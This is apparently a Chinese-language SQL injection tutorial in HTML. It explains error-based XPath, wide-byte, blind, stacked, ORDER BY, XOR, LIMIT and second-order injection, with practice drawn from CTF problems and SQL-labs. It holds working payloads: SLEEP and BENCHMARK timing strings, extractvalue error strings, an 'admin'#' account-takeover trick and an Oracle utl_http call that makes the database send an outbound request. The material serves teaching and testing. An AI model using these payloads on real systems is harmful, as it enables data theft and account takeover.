+<h4 id="6-发起对外请求"><a href="#6-发起对外请求" class="headerlink" title="6. 发起对外请求"></a>6. 发起对外请求</h4><p>Oracle</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select utl_http.request(&#x27;http://10.0.0.1&#x27;) from dual;</span><br><span class="line">select HTTPURITYPE(&#x27;http://10.0.0.1&#x27;).getclob() from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="7-SQL常用函数"><a href="#7-SQL常用函数" class="headerlink" title="7. SQL常用函数"></a>7. SQL常用函数</h4><p><strong>CONCAT</strong> 函数用于将两个字符串连接为一个字符串</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> CONCAT(<span class="string">&#x27;FIRST &#x27;</span>, <span class="string">&#x27;SECOND&#x27;</span>);</span><br><span class="line"> <span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"> <span class="operator">|</span> CONCAT(<span class="string">&#x27;FIRST &#x27;</span>, <span class="string">&#x27;SECOND&#x27;</span>) <span class="operator">|</span></span><br><span class="line"> <span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"> <span class="operator">|</span> <span class="keyword">FIRST</span> <span class="keyword">SECOND</span>               <span class="operator">|</span></span><br><span class="line"> <span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"> <span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<p><strong>IFNULL</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IFNULL(value1,value2);</span><br><span class="line">当value1为<span class="keyword">null</span>时,返回结果为value2</span><br><span class="line">当value1非<span class="keyword">null</span>时,返回结果为value1</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>CAST</strong> 函数用于将某种数据类型的表达式显式转换为另一种数据类型。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CAST</span> (expression <span class="keyword">AS</span> data_type)</span><br><span class="line"></span><br><span class="line">expression：任何有效的SQServer表达式。</span><br><span class="line"><span class="keyword">AS</span>：用于分隔两个参数，在<span class="keyword">AS</span>之前的是要处理的数据，在<span class="keyword">AS</span>之后是要转换的数据类型。</span><br><span class="line">data_type：目标系统所提供的数据类型，包括<span class="type">bigint</span>和sql_variant，不能使用用户定义的数据类型。</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CAST</span>(<span class="string">&#x27;12&#x27;</span> <span class="keyword">AS</span> <span class="type">int</span>)</span><br></pre></td></tr></table></figure>
+
+<p>CONV(x,f1,f2) 把数字x从f1进制转为f2进制。</p>
+<p><strong>substring</strong> 函数是用来抓出一个栏位资料中的其中一部分。这个函数的名称在不同的资料库中不完全一样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL: SUBSTR( ), SUBSTRING( )</span><br><span class="line">Oracle: SUBSTR( )</span><br><span class="line">SQL Server: SUBSTRING( )</span><br><span class="line"></span><br><span class="line">SUBSTR (str, pos)</span><br><span class="line">由 &lt;str&gt; 中，选出所有从第 &lt;pos&gt; 位置开始的字元。请注意，这个语法不适用于 SQL Server 上。</span><br><span class="line"></span><br><span class="line">SUBSTR (str, pos, len)</span><br><span class="line">由 &lt;str&gt; 中的第 &lt;pos&gt; 位置开始，选出接下去的 &lt;len&gt; 个字元。</span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li><p>Length()函数 返回字符串的长度</p>
+</li>
+<li><p>substr()截取字符串，偏移是从1开始，而不是0开始</p>
+</li>
+<li><p>ascii()返回字符的ascii码</p>
+</li>
+<li><p>count(column_name)函数返回指定列的值的数目(NULL 不计入)</p>
+</li>
+<li><p>Length（）函数 返回字符串的长度</p>
+</li>
+<li><p>substr（）截取字符串</p>
+</li>
+<li><p>ascii（）返回字符的ascii码</p>
+</li>
+<li><p>sleep(n)：将程序挂起一段时间 n为n秒</p>
+</li>
+<li><p>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p>
+</li>
+<li><p>count(column_name)函数返回指定列的值的数目(NULL 不计入)concat</p>
+</li>
+</ol>
+<h3 id="二、数据库基础知识"><a href="#二、数据库基础知识" class="headerlink" title="二、数据库基础知识"></a>二、数据库基础知识</h3><h4 id="1-数据库元数据存储位置"><a href="#1-数据库元数据存储位置" class="headerlink" title="1. 数据库元数据存储位置"></a>1. 数据库元数据存储位置</h4><h5 id="1-1-Mysql-版本5-0及以后"><a href="#1-1-Mysql-版本5-0及以后" class="headerlink" title="1.1 Mysql(版本5.0及以后)"></a>1.1 Mysql(版本5.0及以后)</h5><ol>
+<li>元数据位于<code>INFORMATION_SCHEMA</code>虚拟数据库中，可通过<code>SHOW DATABASES</code>和<code>SHOW TABLES</code>命令访问。</li>
+<li>所有MySQL用户均有权访问该数据库中的表，但只能查看表中与该用户访问权限相对应的对象的行。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 列举当前用户可访问的所有的表和数据库</span><br><span class="line">SELECT table_schema,table_name FROM information_schema.tables;</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-2-SQL-Server"><a href="#1-2-SQL-Server" class="headerlink" title="1.2 SQL Server"></a>1.2 SQL Server</h5><ol>
+<li>可通过<code>INFORMATION_SCHEMA</code>或系统表<code>SYSOBJECTS,SYSINDEXKEYS,SYSINDEXES,SYSCOLUMNS,SYSTYPES等</code>或系统存储过程来访问元数据。</li>
+<li>SQLServer 2005引入了一些名为<code>sys.</code>的目录试图，并限制用户只能访问拥有相对应权限的对象。所有的用户均有权访问数据库中的表并查看表中的所有行，而不管用户是否对表或所查阅的数据拥有相对应的访问权限。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--使用目录视图列举所有可访问的表</span><br><span class="line">SELECT name FROM sys.tables;</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-3-Oracle"><a href="#1-3-Oracle" class="headerlink" title="1.3 Oracle"></a>1.3 Oracle</h5><ol>
+<li><p>有很多全局内置视图来访问 Oracle 的元数据</p>
+</li>
+<li><p>ALL_TABLES, ALL_TAB_COLUMNS &#96;列出了当前用户可访问的属性和对象。</p>
+</li>
+<li><p><code>USER_</code>开头的视图只显示当前用户拥有的对象</p>
+</li>
+<li><p><code>DBA_</code>开头的视图显示数据库中的所有对象。需要有 DBA 权限</p>
+</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--列举当前用户可访问的所有的表</span></span><br><span class="line"><span class="keyword">SELECT</span> OWNER, TABLE_NAME <span class="keyword">FROM</span> ALL_TABLES <span class="keyword">ORDER</span> <span class="keyword">BY</span> TABLE_NAME;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-数据库内置变量"><a href="#2-数据库内置变量" class="headerlink" title="2. 数据库内置变量"></a>2. 数据库内置变量</h4><h5 id="2-1-获取数据库版本信息"><a href="#2-1-获取数据库版本信息" class="headerlink" title="2.1 获取数据库版本信息"></a>2.1 获取数据库版本信息</h5><table>
+<thead>
+<tr>
+<th>数据库服务器</th>
+<th>查询语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MSSQL</td>
+<td><code>SELECT@@version</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SELECT version()</code><br /><code>SELECT@@version()</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>SELECT banner FROM v$version; </code><br /><code>   SELECT banner FROM v$version WHERE rownum=1</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SELECT version()</code></td>
+</tr>
+</tbody></table>
+<h5 id="2-2-MSSQL内置变量"><a href="#2-2-MSSQL内置变量" class="headerlink" title="2.2 MSSQL内置变量"></a>2.2 MSSQL内置变量</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@version				-- 数据库服务器版本</span><br><span class="line">@@servername		-- 安装MSSQL的服务器名称</span><br><span class="line">@@language			-- 当前所使用语言的名称。</span><br><span class="line">@@spid					-- 当前用户的进程</span><br><span class="line"></span><br><span class="line">-- 获取更加详细的版本信息</span><br><span class="line">SELECT SERVERPROPERTY(&#x27;productversion&#x27;)</span><br><span class="line">SELECT SERVERPROPERTY(&#x27;productlevel&#x27;)</span><br><span class="line">SELECT SERVERPROPERTY(&#x27;edition&#x27;)</span><br><span class="line">EXEC master..msver</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x01-SQL注入介绍"><a href="#0x01-SQL注入介绍" class="headerlink" title="0x01 SQL注入介绍"></a>0x01 SQL注入介绍</h2><h3 id="一、SQL注入产生的原因"><a href="#一、SQL注入产生的原因" class="headerlink" title="一、SQL注入产生的原因"></a>一、SQL注入产生的原因</h3><h3 id="二、SQL注入分类"><a href="#二、SQL注入分类" class="headerlink" title="二、SQL注入分类"></a>二、SQL注入分类</h3><h4 id="1-报错注入"><a href="#1-报错注入" class="headerlink" title="1. 报错注入"></a>1. 报错注入</h4><h4 id="2-Xpath报错注入"><a href="#2-Xpath报错注入" class="headerlink" title="2. Xpath报错注入"></a><strong>2. Xpath报错</strong>注入</h4><p> <strong>涉及函数</strong></p>
+<p>updatexml():对xml进行查询和修改</p>
+<p>extractvalue():对xml进行查询和修改</p>
+<p> <strong>报错语句构造</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,user(),0x7e))；</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,user(),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br><span class="line">select updatexml(1,concat(0x7e,version(),0x7e),1);</span><br><span class="line">mysql&gt; select updatexml(1,concat(0x7e,version(),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.53~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p> <strong>原理分析</strong></p>
+<p>extractvalue(xml_str , Xpath) 函数,按照Xpath语法从XML格式的字符串中提取一个值，如果函数中任意一个参数为NULL,返回值都是NULL。</p>
+<p>其实就是对XML文档进行查询的函数，相当于HTML文件中用 &#96;&#96;等标签查找元素一样，第一个参数传入目标xml文档，第二个参数使用Xpath路径法表示的查找路径</p>
+<p>举个简单例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractvalue(&#x27;&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;/c&gt;aaaa&lt;/a&gt;&#x27;,&#x27;/a/c&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>寻找前一段xml文档内容中的a节点下的c节点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------------------------------------------------------+</span><br><span class="line">| extractvalue(&#x27;&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;/c&gt;aaaa&lt;/a&gt;&#x27;,&#x27;/a/c&#x27;) |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">| accc                                                     |</span><br><span class="line">+----------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下的使用便是这样，但如果我们构造了不合法的Xpath ，MySQL便会出现语法错误，从而显示出XPath的内容。<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030190908-b1b18954-fb05-1.png"><img src="/images/20191030190908-b1b18954-fb05-1.png" alt="img"></a></p>
+<p>发现报错时少了一部分，没有前面的root，产生这样的问题是<strong>因为Xpath语法只有遇到特殊字符时才会报错</strong></p>
+<p>那我们直接在需要连接的字符前添加特殊字符即可爆出我们想要的结果<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191024-df2a155e-fb05-1.png"><img src="/images/20191030191024-df2a155e-fb05-1.png" alt="img"></a><br>但是也要注意，报错的长度是有一定限制的，不要构造过长的payload，否则后面的字符串会被截断<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191032-e3684bd6-fb05-1.png"><img src="/images/20191030191032-e3684bd6-fb05-1.png" alt="img"></a><br><code>updatexml()</code>函数 与<code>extractvalue()</code>类似 ，是更新xml文档的函数</p>
+<p><code>updatexml()</code>函数有三个参数，分别是(XML_document, XPath_string, new_value)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称 </span><br><span class="line"></span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) </span><br><span class="line"></span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>
+
+<p>原理相同，都是遇到特殊字符爆出错误</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191041-e9457380-fb05-1.png"><img src="/images/20191030191041-e9457380-fb05-1.png" alt="img"></a></p>
+<h4 id="3-宽字节注入"><a href="#3-宽字节注入" class="headerlink" title="3. 宽字节注入"></a>3. 宽字节注入</h4><p> <strong>涉及函数</strong></p>
+<p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串</p>
+<p><code>mysql_real_escape_string()</code> 函数转义 SQL 语句中使用的字符串中的特殊字符</p>
+<p><code>mysql_escape_string()</code> — 转义一个字符串</p>
+<p> 原理分析</p>
+<p>先了解一下什么是窄、宽字节已经常见宽字节编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一、当某字符的大小为一个字节时，称其字符为窄字节.</span><br><span class="line"></span><br><span class="line">二、当某字符的大小为两个字节时，称其字符为宽字节.</span><br><span class="line"></span><br><span class="line">三、所有英文默认占一个字节，汉字占两个字节</span><br><span class="line"></span><br><span class="line">四、常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等</span><br></pre></td></tr></table></figure>
+
+<p>为什么会产生宽字节注入，其中就涉及到编码格式的问题了，宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入</p>
+<p>问题就出现在使用PHP连接MySQL的时候，当设置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">“set character_set_client = gbk”</span><br></pre></td></tr></table></figure>
+
+<p>时会导致一个编码转换的问题</p>
+<p>如果数据库使用的的是GBK编码而PHP编码为UTF8就可能出现注入问题，原因是程序员为了防止SQL注入，就会调用我们上面所介绍的几种函数，将单引号或双引号进行转义操作，转义无非便是在单或双引号前加上斜杠（\）进行转义 ，但这样并非安全，因为数据库使用的是宽字节编码，两个连在一起的字符会被当做是一个汉字，而在PHP使用的UTF8编码则认为是两个独立的字符，如果我们在单或双引号前添加一个字符，使其和斜杠（\）组合被当作一个汉字，从而保留单或双引号，使其发挥应用的作用。但添加的字符的Ascii要大于128，两个字符才能组合成汉字 ，因为前一个ascii码要大于128，才到汉字的范围 ，这一点需要注意。</p>
+<h4 id="4-SQL-盲注"><a href="#4-SQL-盲注" class="headerlink" title="4. SQL 盲注"></a>4. SQL 盲注</h4><p>SQL 盲注是一种SQL 注入漏洞，攻击者可以操纵 SQL 语句，应用会针对真假条件返回不同的值。但是攻击者无法检索查询结果。</p>
+<h4 id="5-堆叠注入"><a href="#5-堆叠注入" class="headerlink" title="5. 堆叠注入"></a>5. 堆叠注入</h4><p> <strong>涉及字符</strong></p>
+<p>分号<code>（;）</code>，在SQL语句中用来表示一条sql语句的结束</p>
+<p><strong>原理分析</strong></p>
+<p>堆叠注入可以执行任意的语句 ，多条sql 语句一起执行。在MYSQL命令框中，常以<code>;</code>作为结束符，那我们便可以在一句SQL语句结束后再紧跟一句SQL语句 。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases;use web1;select 1,2,3;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| BWVS               |</span><br><span class="line">| bbs                |</span><br><span class="line">| challenges         |</span><br><span class="line">| dvwa               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| security           |</span><br><span class="line">| test               |</span><br><span class="line">| web1               |</span><br><span class="line">+--------------------+</span><br><span class="line">10 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>但堆叠注入是有局限性的，并不是每个环境都可以用到的:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一、可能受到API或者数据库引擎不支持的限制 </span><br><span class="line"></span><br><span class="line">二、权限不足</span><br></pre></td></tr></table></figure>
+
+<p>所以一般这种方法的注入只会出现在CTF题中，但正因为这种方法感觉简单，很多人都会忽略掉，强网杯的web题随便注便用到了这种方法，当时真的懵的一批。</p>
+<h4 id="6-Order-By注入"><a href="#6-Order-By注入" class="headerlink" title="6. Order By注入"></a>6. Order By注入</h4><p> <strong>涉及函数</strong></p>
+<p>if()函数<br>updatexml()函数<br>extractvalue()函数<br>regexp()函数<br>rand()函数</p>
+<p> <strong>原理分析</strong></p>
+<p>当用户提供的数据通过MySQL的<code>“Order By”</code>语句中的值进行传递时，如果可控制的位置在order by子句后，如order参数可控：<code>select * from xxxxx order by $_GET[&#39;order&#39;]</code>可能就会引发order by注入</p>
+<p>利用大师傅的环境简单复现一下，源码分析：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">mysql_connect(&quot;127.0.0.1&quot;, &quot;xxxx&quot;, &quot;xxxx&quot;) or die(&quot;Database connection failed &quot;);</span><br><span class="line">mysql_select_db(&quot;sqlidemo&quot;) or die(&quot;Select database failed&quot;);</span><br><span class="line"></span><br><span class="line">$order = $_GET[&#x27;order&#x27;] ? $_GET[&#x27;order&#x27;] : &#x27;name&#x27;;</span><br><span class="line">$sql = &quot;select id,name,price from goods order by $order&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$reslist = array();</span><br><span class="line">while($row = mysql_fetch_array($result, MYSQL_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"> array_push($reslist, $row);</span><br><span class="line">&#125;</span><br><span class="line">echo json_encode($reslist);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>if(语句1、语句2、语句3)</code>如果语句1为真，则执行语句2，否则则执行语句3</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=IF(1=1,name,price) 通过name字段排序</span><br><span class="line">/?order=IF(1=2,name,price) 通过price字段排序</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191820-faee761c-fb06-1.png"><img src="/images/20191030191820-faee761c-fb06-1.png" alt="img"></a><br>简单介绍下SQL语句中<code>case</code> 的两种格式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--简单Case函数</span><br><span class="line">case 列名</span><br><span class="line">when   条件值1   then  选项1</span><br><span class="line">when   条件值2   then  选项2</span><br><span class="line">else   默认值    end</span><br><span class="line"></span><br><span class="line">--Case搜索函数</span><br><span class="line">case  </span><br><span class="line">when  列名=条件值1   then  选项1</span><br><span class="line">when  列名=条件值2   then  选项2</span><br><span class="line">else  默认值 end</span><br></pre></td></tr></table></figure>
+
+<p>两种方式，可以实现相同的功能。简单<code>Case</code>函数的写法相对比较简洁，但是和<code>Case</code>搜索函数相比，功能方面会有些限制，比如写下面的判断式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过name字段排序</span><br><span class="line">/?order=(CASE+WHEN+(1=2)+THEN+name+ELSE+price+END) 通过price字段排序</span><br></pre></td></tr></table></figure>
+
+<p>如果想利用构造的语句的话，直接将后面的选项更改成自己构造的语句即可<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191836-04618ce8-fb07-1.png"><img src="/images/20191030191836-04618ce8-fb07-1.png" alt="img"></a><br><code>IFNULL()</code> 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值，所以也可以通过IFNULL来排序，甚至构造恶意语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=IFNULL(NULL,price) 通过price字段排序</span><br><span class="line">/?order=IFNULL(NULL,name) 通过name字段排序</span><br></pre></td></tr></table></figure>
+
+<p><strong>返回多条记录</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=IF(1=1,1,(select+1+union+select+2)) 正确</span><br><span class="line">/?order=IF(1=2,1,(select+1+union+select+2)) 错误</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191926-21b881b6-fb07-1.png"><img src="/images/20191030191926-21b881b6-fb07-1.png" alt="img"></a><br><strong>利用报错</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=(select+1+regexp+if(1=1,1,0x00)) 正常</span><br><span class="line">/?order=(select+1+regexp+if(1=2,1,0x00)) 错误</span><br><span class="line">/?order=extractvalue(1,if(1=1,1,user())) 正确</span><br><span class="line">/?order=extractvalue(1,if(1=2,1,user())) 错误</span><br></pre></td></tr></table></figure>
+
+<p>利用if语句，也可以在参数order后构造时间盲注，同样也是这里虽然是简单的排序，但如果将语句更改为猜解数据库的语句也是可以的<br>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=if(条件1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间</span><br><span class="line">/?order=if(条件1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒</span><br></pre></td></tr></table></figure>
+
+<p>利用order by注入不可能直接爆出数据，只能通过猜解来获得数据，猜解数据时只能一位一位的猜，所以可以利用<code>substr</code>截取函数以及<code>left</code>、<code>right</code>函数将每个字符分割出来，进行猜解，如果遇到Order by注入，最好用脚本，手注得累死</p>
+<p>Order by注入就是通过这些函数，开发者本意是希望方便用户进行排序观察等，但如果不对其做出任何限制，就会被恶意利用，利用函数的功能去执行一些SQL注入语句，从而泄露信息。</p>
+<h4 id="7-异或注入"><a href="#7-异或注入" class="headerlink" title="7. 异或注入"></a>7. <strong>异或注入</strong></h4><p> <strong>涉及符号</strong></p>
+<p>MySQL中，异或用<code>^</code>或<code>xor</code>表示</p>
+<p> <strong>原理分析</strong></p>
+<p>异或注入原理较为简单一些，运算法则就是：两个条件相同（同真或同假）即为假<code>（0）</code>，两个条件不同即为真<code>（1）</code>，<code>null</code>与任何条件做异或运算都为<code>null</code></p>
+<p>简单在mysql命令行演示一下：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030192057-5874b788-fb07-1.png"><img src="/images/20191030192057-5874b788-fb07-1.png" alt="img"></a><br>用异或方法可以判断一些字符是否被过滤，如:<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030192120-65ed23aa-fb07-1.png"><img src="/images/20191030192120-65ed23aa-fb07-1.png" alt="img"></a><br>CTF题中如果想判断那些函数被过滤，便可以通过异或查询</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">符号^(str)^符号 -符号具体要结合题，str是由我们定义的命令</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-Limit注入"><a href="#8-Limit注入" class="headerlink" title="8. Limit注入"></a>8. Limit注入</h4><p><strong>此方法适用于MySQL 5.x中，在limit语句后面的注入</strong></p>
+<p><strong>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 报错注入</span><br><span class="line">mysql&gt; select * from users where id&gt;1 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </span><br><span class="line"></span><br><span class="line"># 时间注入</span><br><span class="line">select * from users where id&gt;1 order by id limit 1,1 procedure analyse((select extractvalue</span><br><span class="line">(rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);</span><br></pre></td></tr></table></figure>
+
+<h4 id="10-二次注入"><a href="#10-二次注入" class="headerlink" title="10. 二次注入"></a>10. 二次注入</h4><p>看到涉及到的函数是不是感觉很熟悉，这是因为大多数网站都会对用户输入的语句进行对特殊符号的过滤，例如：恶意用户构造的插入语句为<code>1&#39;</code>,经过这些函数的处理则变为<code>1\&#39;</code>,这样便可以防止用户向服务器插入数据时引发的一些恶意操作，但这只是中途过滤了一下，最终返回到数据库里面的数据还是<code>1&#39;</code>,如果管理者对取出的数据没有进行进一步的检验处理，服务器从数据库取出恶意数据，未经过滤就直接拼接SQL语句进行查询，就会发生了SQL二次注入。</p>
+<p><strong>注意</strong>：二次注入不是注入两次的意思，二次注入相当于存储型的注入，可以看下面的图，介绍的也很直观。<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191521-8fffd9ea-fb06-1.png"><img src="/images/20191030191521-8fffd9ea-fb06-1.png" alt="img"></a><br>总结起来 二次注入其实是分为两个步骤：</p>
+<ol>
+<li><p>插入恶意数据</p>
+</li>
+<li><p>引用恶意数据</p>
+<p>原理既是如此，但不实战是无法掌握的，下面就来实战练习二次注入。</p>
+</li>
+</ol>
+<p> <strong>题目实战</strong></p>
+<p>SQL-labs24关便涉及到二次注入</p>
+<p>先来看一下登陆时的源码<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191538-9a5cff30-fb06-1.png"><img src="/images/20191030191538-9a5cff30-fb06-1.png" alt="img"></a><br>过滤函数将特殊符号给过滤掉了，所以直接注入是没戏的</p>
+<p>再来查看一下用户注册的源码<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191621-b3b34070-fb06-1.png"><img src="/images/20191030191621-b3b34070-fb06-1.png" alt="img"></a><br>同样过滤特殊字符，从注册进行注入也是不可能了</p>
+<p>最后看一下修改密码的源码<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191639-be682904-fb06-1.png"><img src="/images/20191030191639-be682904-fb06-1.png" alt="img"></a><br>同样如此，那就只能利用二次注入，先将恶意语句注入进数据库中，再调用</p>
+<p>我们先注册一个用户<code>admin&#39;#</code>,密码设置为<code>123</code>，注册好之后查看一下数据库</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191651-c5bba2ee-fb06-1.png"><img src="/images/20191030191651-c5bba2ee-fb06-1.png" alt="img"></a><br>注册成功，这时其实我们就可以修改管理员<code>admin</code>，为什么那，来看下修改密码的sql语句</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030192659-2ffbf1e4-fb08-1.png"><img src="/images/20191030192659-2ffbf1e4-fb08-1.png" alt="img"></a><br>我们用户名为<code>admin&#39;#</code>，调用该用户时，SQL语句则变为了<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191747-e6bd88d6-fb06-1.png"><img src="/images/20191030191747-e6bd88d6-fb06-1.png" alt="img"></a><br>我们将<code>admin</code>密码更改为123456,测试一下<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191030191801-ef3e04f4-fb06-1.png"><img src="/images/20191030191801-ef3e04f4-fb06-1.png" alt="img"></a><br>更改成功，这便是二次注入的简单利用</p>
+<h2 id="0x02-确认SQL注入点"><a href="#0x02-确认SQL注入点" class="headerlink" title="0x02 确认SQL注入点"></a>0x02 确认SQL注入点</h2><p>并不存在真正完美的规则可以确定某个输入是否会触发 SQL 注入漏洞，因为存在无数种可能的情况。测试潜在的 SQL 注入时，必须坚持不懈并留心细节信息，这一点非常重要。</p>
+<p>在心里重建开发人员在 web 应用中编写的代码以及设想远程 SQL 代码的内容以及潜在效果。这一点非常重要。</p>
+<h3 id="一、通过报错信息测试-SQL-注入"><a href="#一、通过报错信息测试-SQL-注入" class="headerlink" title="一、通过报错信息测试 SQL 注入"></a>一、通过报错信息测试 SQL 注入</h3><p><strong>我们通常用注入一个<code>&#39;</code>的方式，来通过返回的数据库报错信息来判断是否有 SQL 注入。</strong></p>
+<blockquote>
+<p>如果一个参数本应接收为一个数字，而输入了一个字符串。则 MySQL、SQL Server 会认为，如果该值不是一个数字，那么他肯定是个列名。</p>
+</blockquote>
+<h4 id="0-关于报错信息"><a href="#0-关于报错信息" class="headerlink" title="0. 关于报错信息"></a>0. 关于报错信息</h4><p>当Web服务器收到数据库返回的错误信息时，一般会选择如下几种方式进行返回。</p>
+<ol>
+<li>将 SQL 错误显示在页面上，对 Web 浏览器用户可见.</li>
+<li>将 SQL 错误隐藏在 web 页面的源代码中以便于调试</li>
+<li>检测到错误时跳转到另一个页面。</li>
+<li>返回 HTTP 错误代码 500 或 HTTP 重定向代码 302</li>
+<li>应用适当的处理错误但不显示结果，可能会显示一个通用的错误页面。</li>
+</ol>
+<h4 id="1-典型的-MySQL-报错举例"><a href="#1-典型的-MySQL-报错举例" class="headerlink" title="1. 典型的 MySQL 报错举例"></a>1. 典型的 MySQL 报错举例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP+MySQL</span><br><span class="line">Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in /var/www/a.com/a.php on line 8</span><br></pre></td></tr></table></figure>
